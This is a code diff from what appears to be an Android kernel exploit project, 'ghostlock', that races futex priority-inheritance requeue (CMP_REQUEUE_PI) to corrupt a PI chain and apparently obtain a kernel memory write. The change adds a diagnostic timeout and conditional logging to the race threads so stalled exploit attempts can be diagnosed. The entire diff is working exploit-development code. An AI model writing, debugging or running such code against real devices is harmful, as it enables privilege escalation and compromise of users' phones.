@@ -172,10 +172,40 @@ namespace ghostlock::race {
  * route outcome once the waiter reported completion. The count/timeout policy
  * lives in outcome_with_counters() and TODO(pi-timeout-01). */
 ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
-    while (!waiter_waiting.load() || !owner_started.load())
+    /* TODO(pi-timeout-01) bounds the route_done wait below but not this one, so
+     * a waiter that never parks spins silently forever. On A53 that surfaced as
+     * a watchdog reboot with a plain "reboot" reason and an empty pstore,
+     * leaving nothing on disk to explain it. The deadline is diagnostic-only: it
+     * changes the race path, so it stays behind GHOSTLOCK_DIAG until it has been
+     * re-verified on device. */
+#if defined(GHOSTLOCK_DIAG)
+    struct timespec park_started{};
+    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &park_started));
+    const double park_timeout_ms = static_cast<double>(
+        session::g_exploit_session.profile.race_route_done_timeout_ms());
+#endif
+    while (!waiter_waiting.load() || !owner_started.load()) {
+#if defined(GHOSTLOCK_DIAG)
+        if (runtime_time::runtime_elapsed_ms(&park_started) >= park_timeout_ms) {
+            pr_warning("[route] park timeout waiter_waiting=%d owner_started=%d "
+                       "waiter_ready=%d waiter_tid=%d +%.0fms\n",
+                       waiter_waiting.load(), owner_started.load(),
+                       waiter_ready.load(), waiter_tid.load(),
+                       runtime_time::runtime_elapsed_ms(&park_started));
+            support::log_sync();
+            return route::RouteStatus{
+                .code = route::ROUTE_DIRTY_FAILURE,
+                .step = 19,
+                .error_number = ETIMEDOUT,
+            };
+        }
+#endif
         usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
+    }
     pr_info("[route] waiter parked; owner started\n");
+#if defined(GHOSTLOCK_DIAG)
     support::log_sync();
+#endif
     usleep(fast_repair.load()
                ? 5000
                : session::g_exploit_session.profile.race_setup_settle_us());
@@ -185,7 +215,9 @@ ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
                                 &target_futex, 0);
     pr_info("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
             rq, errno);
+#if defined(GHOSTLOCK_DIAG)
     support::log_sync();
+#endif
     /* TODO(pi-timeout-01): This wait has no deadline. A route that stalls in
      * the race window (observed when the Shizuku log pipe applied
      * backpressure) parks the process forever and the corrupted PI chain is
@@ -220,7 +252,9 @@ namespace ghostlock::race {
     Status run_main_route_threads(const memory::WriteRequest &request) {
         reset_main_route_state();
         pr_info("[route] creating waiter/owner/consumer\n");
+#if defined(GHOSTLOCK_DIAG)
         support::log_sync();
+#endif
         int32_t error = session::g_exploit_session.race.start_threads(
             waiter_thread, owner_thread, consumer_thread, &request);
         if (error) {
@@ -247,7 +281,9 @@ namespace ghostlock::race {
             support::fail_stop_dirty_race("PI worker join", join_error);
         }
         pr_info("[route] threads joined\n");
+#if defined(GHOSTLOCK_DIAG)
         support::log_sync();
+#endif
         return status.code == route::ROUTE_OK;
     }
 } // namespace ghostlock::race
